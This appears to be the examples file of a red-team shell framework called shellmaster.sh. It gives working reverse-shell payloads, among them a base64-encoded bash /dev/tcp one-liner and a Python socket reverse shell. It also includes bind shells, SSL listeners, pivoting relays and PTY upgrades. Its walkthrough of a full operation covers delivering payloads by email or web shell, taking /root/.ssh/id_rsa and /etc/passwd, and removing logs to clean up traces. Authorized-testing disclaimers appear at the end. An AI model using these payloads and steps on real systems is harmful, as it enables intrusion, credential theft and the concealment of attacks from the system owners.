# 📖 Examples & Use Cases

Real-world examples and practical use cases for the Red Team Shell Framework.

---

## Table of Contents

1. [Basic Listener Setup](#basic-listener-setup)
2. [Payload Generation](#payload-generation)
3. [Encrypted Connections](#encrypted-connections)
4. [File Transfers](#file-transfers)
5. [Pivoting & Relays](#pivoting--relays)
6. [PTY Upgrade](#pty-upgrade)
7. [Advanced Scenarios](#advanced-scenarios)

---

## Basic Listener Setup

### Example 1: Simple Reverse Listener

Start a reverse shell listener on port 4444:

```bash
$ ./shellmaster.sh
[*] Red Team Shell Framework v1.0.0
[*] Choose an option:
    1) Listeners (Create reverse/bind shells)
    2) Shells (Generate payloads)
    3) Encryption (Setup encrypted tunnels)
    4) Transfers (Upload/download files)
    5) Relay (Create pivoting chains)
    6) Upgrade (Get interactive PTY)
    7) Exit

> 1

[*] Listener Options:
    1) Reverse Listener
    2) Bind Listener
    3) Back

> 1

Enter port to listen on [4444]: 4444
[+] Listening on port 4444...
[+] New connection from 192.168.1.100!
```

---

### Example 2: Bind Shell Listener

Set up a bind shell on compromised target:

```bash
# On attacker machine
> 1 > 2
Enter port for bind shell [5555]: 5555

# Then connect to it
$ nc 192.168.1.100 5555
Connected!
```

---

## Payload Generation

### Example 1: Generate Bash Payload

Create a Base64-encoded bash payload:

```bash
$ ./shellmaster.sh
> 2 (Shells)
> 1 (Bash payload)
Enter attacker IP [192.168.1.100]: 192.168.1.100
Enter attacker port [4444]: 4444
Encoding format [plain/base64/url]:  base64

[+] Payload generated:
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==

# Decode and use
$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==" | base64 -d | bash
```

---

### Example 2: Generate PowerShell Payload

Create a PowerShell one-liner for Windows targets:

```bash
$ ./shellmaster.sh
> 2 (Shells)
> 2 (PowerShell payload)
Enter attacker IP: 192.168.1.100
Enter attacker port: 4444
Format [plain/base64]: base64

[+] Payload generated:
powershell -e [base64_string]

# On Windows target
C:\> powershell -e [base64_string]
```

---

### Example 3: Python Payload for Linux

Generate Python reverse shell:

```bash
$ ./shellmaster.sh
> 2 (Shells)
> 3 (Python payload)
Enter IP: 192.168.1.100
Enter port: 4444

[+] Payload:
python -c "import socket,subprocess,os;s=socket.socket();s.connect(('192.168.1.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

---

## Encrypted Connections

### Example 1: SSL-Encrypted Listener

Set up encrypted listener with socat:

```bash
$ ./shellmaster.sh
> 3 (Encryption)
> 1 (Generate certificate)
Enter certificate output path [certs/cert.pem]: 
Enter key output path [certs/key.pem]:

[+] Certificate generated:
    Cert: certs/cert.pem
    Key: certs/key.pem

> 2 (Create SSL listener)
Enter port [4444]: 4444

[+] SSL listener on port 4444
[+] Encrypted connection from 192.168.1.100
```

---

### Example 2: Connect to Encrypted Listener

From attacker side:

```bash
# Create encrypted connection
$ socat - OPENSSL-CONNECT:192.168.1.100:4444,verify=0

# Or with ncat
$ ncat --ssl 192.168.1.100 4444
```

---

## File Transfers

### Example 1: Download File via SCP

Download file from compromised system:

```bash
$ ./shellmaster.sh
> 4 (Transfers)
> 1 (Download file)
Enter remote host: 192.168.1.100
Enter remote file path: /etc/passwd
Enter local destination: ./passwd.txt
Enter username: root

[+] Downloaded: ./passwd.txt
[+] Size: 1234 bytes
[+] Checksum: abc123def456...
```

---

### Example 2: Upload Tool to Target

Upload exploit script to compromised system:

```bash
$ ./shellmaster.sh
> 4 (Transfers)
> 2 (Upload file)
Enter local file: ./privesc.sh
Enter remote host: 192.168.1.100
Enter destination: /tmp/privesc.sh
Enter username: compromised_user

[+] Uploaded successfully
[+] File: /tmp/privesc.sh (15 KB)
```

---

### Example 3: Verify File Integrity

Ensure downloaded file wasn't modified:

```bash
$ ./shellmaster.sh
> 4 (Transfers)
> 3 (Verify checksum)
Enter file path: ./passwd.txt
Enter expected SHA256: abc123def456...

[+] Checksum match! ✓
```

---

## Pivoting & Relays

### Example 1: Create Port Relay

Forward connections through compromised system:

```bash
# On pivot host (192.168.2.100)
$ ./shellmaster.sh
> 5 (Relay)
> 1 (Create relay)
Enter listen port: 5555
Enter forward host: 192.168.3.100
Enter forward port: 3306

[+] Relay created
[+] 5555 -> 192.168.3.100:3306

# From attacker
$ mysql -h 192.168.2.100 -p 5555
```

---

### Example 2: Multi-Hop Shell Chain

Create relay through multiple compromised systems:

```bash
# System 1 (Pivot)
Attacker -> System1:4444 (listener)

# System 1 forwards to System 2
./shellmaster.sh > 5 > 1
Listen: 5555
Forward: System2:4444

# System 2 forwards to System 3
Listen: 6666
Forward: System3:7777

# Result: Three-hop shell chain
```

---

## PTY Upgrade

### Example 1: Upgrade to Interactive PTY

Convert non-interactive shell to full TTY:

```bash
# After reverse shell connection
$ ./shellmaster.sh
> 6 (Upgrade)
> 1 (Upgrade to PTY)

[+] Upgrading shell to interactive PTY...
[+] Using Python for PTY spawn
[+] Shell upgraded successfully!

# Now you have full interactive shell with colors, history, etc.
```

---

### Example 2: Environment Fix

Properly set environment variables:

```bash
$ ./shellmaster.sh
> 6 (Upgrade)
> 2 (Fix environment)

[+] Setting TERM=xterm-256color
[+] Setting SHELL=/bin/bash
[+] Setting PATH correctly

$ env
TERM=xterm-256color
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
```

---

## Advanced Scenarios

### Scenario 1: Complete Red Team Operation

Full workflow for authorized security testing:

```bash
# Step 1: Generate payload
$ ./shellmaster.sh
> 2 > 1 (Generate bash payload)
Enter IP: 192.168.1.200
Enter port: 4444
Format: base64

# Step 2: Start encrypted listener
$ ./shellmaster.sh
> 3 > 1 (Generate cert)
> 2 (Create SSL listener on 4444)

# Step 3: Deliver payload to target
$ echo "[payload]" | bash  # Via email, web shell, etc.

# Step 4: Accept connection and upgrade shell
[+] New connection from 192.168.1.100
> 6 > 1 (Upgrade to PTY)

# Step 5: Enumerate compromised system
$ whoami
root
$ id
uid=0(root) gid=0(root) groups=0(root)

# Step 6: Download sensitive files
./shellmaster.sh
> 4 > 1 (Download)
Enter path: /root/.ssh/id_rsa

# Step 7: Clean up traces
# (Log cleanup, remove payloads, etc.)
```

---

### Scenario 2: Lateral Movement via Pivoting

Move through network using compromised systems:

```bash
# System A (Compromised web server)
$ ./shellmaster.sh
> 5 > 1 (Create relay)
Listen: 5555
Forward: 192.168.2.10 (Internal database)
Port: 3306

# From attacker
$ mysql -h [SystemA] -p 5555 -u root

# System B (Database)
# Can now access database through web server pivot
```

---

### Scenario 3: Multi-Target Management

Handle multiple shells simultaneously:

```bash
# Session 1: Target Linux server
$ ./shellmaster.sh
[Session 1] > listener on 4444
[Session 1] > receives bash shell

# Session 2 (new terminal): Target Windows server
$ ./shellmaster.sh
[Session 2] > listener on 5555
[Session 2] > receives PowerShell

# Logs track all activity
$ tail -f logs/sessions/shell_*.json

# Review activity
cat logs/framework.log | grep "session_"
```

---

## Quick Reference

### Common Commands

```bash
# Start framework
./shellmaster.sh

# Generate bash payload
Generate Bash > 192.168.1.100:4444

# Create listener
Listeners > Reverse > port 4444

# Create SSL listener
Encryption > Generate cert > SSL listener

# Download file
Transfers > Download > remote:path

# Create relay
Relay > Create > 5555 -> target:3306

# Upgrade shell
Upgrade > Upgrade to PTY
```

---

## Best Practices

1. **Always use encryption** - Enable SSL/TLS for all connections
2. **Log everything** - Enable session logging for audit trails
3. **Clean up** - Remove payloads and logs after operation
4. **Test first** - Run all commands in lab before live engagement
5. **Document** - Record all activities in authorized scope
6. **Authorize** - Get written permission before any operation

---

## Testing Checklist

- [ ] Framework works in lab environment
- [ ] Payloads execute correctly on target OS
- [ ] Encrypted connections work without errors
- [ ] File transfers complete with correct checksums
- [ ] Relay chains work through multiple hops
- [ ] PTY upgrade produces interactive shell
- [ ] Logs are created and contain correct data
- [ ] Cleanup removes all artifacts properly

---

**Remember: These examples are for AUTHORIZED security testing only. Ensure you have explicit permission before any real engagement.**

---
